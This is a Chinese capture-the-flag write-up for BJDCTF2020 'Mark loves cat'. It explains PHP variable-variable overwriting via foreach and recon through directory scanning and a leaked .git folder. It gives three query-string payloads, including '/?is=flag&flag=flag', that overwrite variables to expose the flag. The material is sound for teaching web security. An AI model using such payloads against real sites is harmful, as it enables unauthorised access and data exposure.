# [BJDCTF2020]Mark loves cat foreach导致变量覆盖

## 这里我们着重了解一下变量覆盖

首先我们要知道函数是什么

## foreach

```php
 
 
foreach (iterable_expression as $value)
    statement
foreach (iterable_expression as $key => $value)
    statement
 
第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。
 
第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。 
 
```

不一样只是键名是否赋值

```php
数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。
```

## 变量覆盖

这个其实很简单 就是有点绕

```php
<?php
$ary=array('a','b','c','c','e');
foreach($ary as $key=>$value){     //$ary的键名赋给$key，键值赋给$value
	$$key=$value;    //把键值赋给$$key
}
print_r($key);      //输出4
因为 数组为5 那么就是有 01234个值 这里就会将 $ary的值存入 就是4
print_r($value);    //输出e
因为经过遍历 所以这里是指向最后一个值 就是 $arr[4]=e
 
 
 
print_r($$key);      //输出e
最后 $$key=$value
 
类似于
$(key)=value
所以输出$$key 就会输出 $(key) 就会输出 value =e
 
?>
```

已经感觉类似渗透了

直接dir扫一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/3933950c9a90c2b1876200f34e3c49b3.png" alt="" style="max-height:198px; box-sizing:content-box;" />


一下就想到git泄露

我们直接githack



<img src="https://i-blog.csdnimg.cn/blog_migrate/5353ddf015f815a4898efa53ae6e7a9d.png" alt="" style="max-height:137px; box-sizing:content-box;" />


直接看看源代码

flag.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/67bb2fbdf0daca1a37f91e2c63638f75.png" alt="" style="max-height:118px; box-sizing:content-box;" />


index.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/10fac8bf1e56c04a722e32447cb3bbea.png" alt="" style="max-height:707px; box-sizing:content-box;" />


这里存在echo 我们直接去看看网站哪里存在输出了



<img src="https://i-blog.csdnimg.cn/blog_migrate/e81ec144eb28ecf2b997317c1e53a1ab.png" alt="" style="max-height:335px; box-sizing:content-box;" />


然后我们就可以确定现在输出的是$yds变量 我们开始代码审计

### 分析

```php
1.输出是dog 那么就是$yds
只有在
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
会输出yds 所以我们需要传递 POST GET参数
```

我们思考完这个 我们想想看如何可以让 flag输出



<img src="https://i-blog.csdnimg.cn/blog_migrate/65ce8543ce06443091b353e0a45c3cce.png" alt="" style="max-height:84px; box-sizing:content-box;" />


我们可以通过 exit()输出flag值

```ruby
首先这里是输出yds
 
那么很简单
 
我们get的参数就是 yds
 
 
$$yds
 
但是输出的是 $yds
 
所以我们只需要让 $yds=$flag 
 
就可以变相exit($flag)了
 
$$yds=$$flag
 
就类似于
 
$(yds)=$(flag)
 
所以我们只需要传递 yds=flag即可
 
/?yds=flag
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/40681a25bd4c32d32e6d2bab904e0d49.png" alt="" style="max-height:149px; box-sizing:content-box;" />


### 第二种

```cobol
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
 
这里存在 post的值绝对为flag 或者 get的值绝对为flag
 
```

我们首先看post

```cobol
flag=flag
 
$x=$flag=flag
这样就失去了变量 所以无法
```

接着我们看看get

```cobol
flag=flag
$$flag=$flag=$flag
 
因为我们要输出is
 
所以
 
?is=flag
 
现在这里是 
 
 
$(is)=$(flag)
 
然后跟上 &flag=flag
 
这样的话
 
$(flag)=$(flag)
 
最后转换还是
 
$(is)=$(flag)
 
这样就可以输出了
```

这样就可以输出flag了

```cobol
/?is=flag&flag=flag
```

### 第三种

```cobol
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
 
get的flag值绝对为 $x 并且 $x不为 flag
```



```cobol
我们还是确定我们需要输出 handsome
 
所以我们构造 ?handsome=flag
 
这样
 
$(handsome)=$(flag)
 
然后就会去看看$flag是啥 但是这里$不能为flag
 
我们在中间搭建一个桥梁即可
 
?handsome=flag&flag=b&b=flag
 
这样
 
$(handsom)=$(flag)
然后
$flag=$b
就绕过了!==判断
 
然后$(b)=flag
 
这里别的师傅有更简单的思路
 
?flag=a&&a!=flag
 
所以我们构造一个中间值传递参数即可
```